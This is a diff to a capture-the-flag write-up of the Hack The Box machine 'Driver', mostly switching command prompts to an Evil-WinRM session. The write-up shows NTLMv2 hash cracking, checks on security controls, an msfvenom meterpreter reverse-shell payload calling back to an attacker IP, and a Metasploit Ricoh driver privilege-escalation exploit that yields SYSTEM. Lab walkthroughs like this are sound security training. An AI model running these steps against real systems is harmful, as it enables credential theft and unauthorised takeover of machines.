@@ -364,10 +364,10 @@ Now we have `tony`'s password hash. Great!
 
 ### Hash cracking
 
-Let's place the NTLMv2 hash we managed to retrieve into `/workspace/hash`. I'm going to use `hashcat` with the `rockyou` wordlist to attempt to crack it.
+Let's place the NTLMv2 hash we managed to retrieve into `/workspace/NTLMv2.hash`. I'm going to use `hashcat` with the `rockyou` wordlist to attempt to crack it.
 
 ```sh
-❯ hashcat -a 0 -m 5600 /workspace/hash /usr/share/wordlists/rockyou.txt -O
+❯ hashcat -m 5600 /workspace/NTLMv2.hash -a 0 /usr/share/wordlists/rockyou.txt -O
 ```
 
 ```
@@ -395,8 +395,6 @@ Remember our port scanning ealier? We noticed that Driver was accepting connecti
 
 It worked. Nice!
 
-I don't need Powershell though, and I can't manage to downgrade to `cmd.exe`. Hence, I'll use `msfvenom` to obtain a reverse shell.
-
 # Local enumeration
 
 If we run `whoami`, we see that we got a foothold as `tony`.
@@ -405,8 +403,8 @@ If we run `whoami`, we see that we got a foothold as `tony`.
 
 Let's gather some information about the Windows version of Driver.
 
-```cmd
-C:\Users\tony\Documents> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
+```ps1
+*Evil-WinRM* PS C:\Users\tony\Documents> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
 ```
 
 ```
@@ -416,8 +414,8 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
 
 Okay, so this is Windows 10 Entreprise!
 
-```cmd
-C:\Users\tony\Documents> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuildNumber
+```ps1
+*Evil-WinRM* PS C:\Users\tony\Documents> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuildNumber
 ```
 
 ```
@@ -433,8 +431,8 @@ This version of Windows is pretty recent, so we're unlikely to find any serious 
 
 What is Driver's architecture?
 
-```cmd
-C:\Users\tony\Documents> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v PROCESSOR_ARCHITECTURE
+```ps1
+*Evil-WinRM* PS C:\Users\tony\Documents> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v PROCESSOR_ARCHITECTURE
 ```
 
 ```
@@ -448,8 +446,8 @@ So this system is using x64. This will be useful to know if we want to compile o
 
 Let's check if Windows Defender is enabled.
 
-```cmd
-C:\Users\tony\Documents> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender" /v ProductStatus
+```ps1
+*Evil-WinRM* PS C:\Users\tony\Documents> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender" /v ProductStatus
 ```
 
 ```
@@ -463,8 +461,8 @@ It's disabled! That's great, it will make our life easier.
 
 Let's check if there's any AMSI provider.
 
-```cmd
-C:\Users\tony\Documents> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI\Providers"
+```ps1
+*Evil-WinRM* PS C:\Users\tony\Documents> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI\Providers"
 ```
 
 There's no output, so no AMSI provider here!
@@ -473,8 +471,8 @@ There's no output, so no AMSI provider here!
 
 Let's see which Windows Firewall policies profiles are enabled.
 
-```cmd
-C:\Users\tony\Documents> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy" /s /v EnableFirewall
+```ps1
+*Evil-WinRM* PS C:\Users\tony\Documents> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy" /s /v EnableFirewall
 ```
 
 ```
@@ -496,8 +494,8 @@ Okay, so all Firewall profiles are enabled. It shouldn't hinder our progression 
 
 Let's gather the list of connected NICs.
 
-```cmd
-C:\Users\tony\Documents> ipconfig /all
+```ps1
+*Evil-WinRM* PS C:\Users\tony\Documents> ipconfig /all
 ```
 
 ```
@@ -551,8 +549,8 @@ Looks like there's a single network.
 
 Let's enumerate all local users using `PowerView`.
 
-```cmd
-C:\Users\tony\Documents> powershell -command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted; Import-Module C:\tmp\PowerView.ps1; Get-NetLocalGroupMember -GroupName Users | Where-Object { $_.MemberName -notmatch 'NT AUTHORITY' } | Select-Object GroupName, MemberName, SID | Format-Table"
+```ps1
+*Evil-WinRM* PS C:\Users\tony\Documents> Get-NetLocalGroupMember -GroupName Users | Where-Object { $_.MemberName -notmatch 'NT AUTHORITY' } | Select-Object GroupName, MemberName, SID | Format-Table
 ```
 
 ```
@@ -567,8 +565,8 @@ It looks like there's only us, `tony`.
 
 Let's enumerate all local groups, once again using `PowerView`.
 
-```cmd
-C:\Users\tony\Documents> powershell -command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted; Import-Module C:\tmp\PowerView.ps1; Get-NetLocalGroup | Select-Object GroupName, Comment | Format-Table | Out-String -Width 4096"
+```ps1
+*Evil-WinRM* PS C:\Users\tony\Documents> Get-NetLocalGroup | Select-Object GroupName, Comment | Format-Table | Out-String -Width 4096
 ```
 
 ```
@@ -600,8 +598,8 @@ Looks classic.
 
 Let's gather more information about us.
 
-```cmd
-C:\Users\tony\Documents> net user tony
+```ps1
+*Evil-WinRM* PS C:\Users\tony\Documents> net user tony
 ```
 
 ```
@@ -638,8 +636,8 @@ We don't belong to interesting groups.
 
 If we check our home folder, we find the user flag on our Desktop. Let's retrieve its content.
 
-```cmd
-C:\Users\tony\Documents> type C:\Users\tony\Desktop\user.txt
+```ps1
+*Evil-WinRM* PS C:\Users\tony\Documents> type $env:USERPROFILE\Desktop\user.txt
 ```
 
 ```
@@ -652,8 +650,8 @@ Apart from this file, there's nothing.
 
 Let's check the history of commands ran by `tony`.
 
-```cmd
-C:\Users\tony\Documents> type C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```ps1
+*Evil-WinRM* PS C:\Users\tony\Documents> type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 ```
 
 ```
@@ -677,24 +675,23 @@ Let's follow the instructions detailed on [the blog](https://www.pentagrid.ch/en
 
 First, we must find the Ricoh drivers installed on the machine.
 
-```cmd
-C:\Users\tony\Documents> dir "C:\ProgramData\RICOH_DRV" /a
+```ps1
+*Evil-WinRM* PS C:\Users\tony\Documents> dir "C:\ProgramData\RICOH_DRV" -Force
 ```
 
 ```
 <SNIP>
-06/11/2021  06:21 AM    <DIR>          .
-06/11/2021  06:21 AM    <DIR>          ..
-06/11/2021  06:31 AM    <DIR>          RICOH PCL6 UniversalDriver V4.23
-<SNIP>
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d--h--        6/11/2021   7:31 AM                RICOH PCL6 UniversalDriver V4.23
 ```
 
 Okay, so a driver named `RICOH PCL6 UniversalDriver V4.23` is installed. This is the same as in the blog.
 
 Now, we can check the permissions for the DLLs in the `\_common\dlz\` subdirectory:
 
-```cmd
-C:\Users\tony\Documents> icacls "C:\ProgramData\RICOH_DRV\RICOH PCL6 UniversalDriver V4.23\_common\dlz\*.dll"
+```ps1
+*Evil-WinRM* PS C:\Users\tony\Documents> icacls "C:\ProgramData\RICOH_DRV\RICOH PCL6 UniversalDriver V4.23\_common\dlz\*.dll"
 ```
 
 ```
@@ -725,7 +722,7 @@ There's one caveat though: it requires to be run in a Meterpreter shell, since i
 To do so, we'll create a meterpreter reverse shell payload.
 
 ```sh
-❯ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5  LPORT=9002 -f exe -o /workspace/server/meterpreter_revshell.exe
+❯ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=9001 -f exe -o /workspace/server/meterpreter_revshell.exe
 ```
 
 ```
@@ -799,8 +796,8 @@ msf6 exploit(windows/local/ricoh_driver_privesc) > run
 ```
 
 ```
-[-] Handler failed to bind to 10.10.14.5:9003:-  -
-[-] Handler failed to bind to 0.0.0.0:9003:-  -
+[-] Handler failed to bind to 10.10.14.5:9002:-  -
+[-] Handler failed to bind to 0.0.0.0:9002:-  -
 [*] Running automatic check ("set AutoCheck false" to disable)
 [+] The target appears to be vulnerable. Ricoh driver directory has full permissions
 [*] Adding printer hGYIqM...
@@ -808,7 +805,7 @@ msf6 exploit(windows/local/ricoh_driver_privesc) > run
 [*] Exploit completed, but no session was created.
 ```
 
-I opened my own listener on port `9003`, this is why Metasploit failed to bind to this address. It looks like it successfully completed the exploit though:
+I opened my own listener on port `9002`, this is why Metasploit failed to bind to this address. It looks like it successfully completed the exploit though:
 
 ```
 connect to [10.10.14.5] from (UNKNOWN) [10.10.11.106] 49419
@@ -818,17 +815,9 @@ Microsoft Windows [Version 10.0.10240]
 C:\Windows\system32>
 ```
 
-Let's confirm that we are `NT AUTHORITY\SYSTEM`:
+It's a standard one though, so I'll transform it into a Powershell session.
 
-```cmd
-C:\Windows\system32> whoami
-```
-
-```
-nt authority\system
-```
-
-Great!
+If we run `whoami`, we can confirm that we are `NT AUTHORITY\SYSTEM`!
 
 # Local enumeration
 
@@ -836,8 +825,8 @@ Great!
 
 The only thing we need to do to finish this box is to retrieve the root flag. As usual, we can find it on our Desktop!
 
-```cmd
-C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
+```ps1
+PS C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
 ```
 
 ```
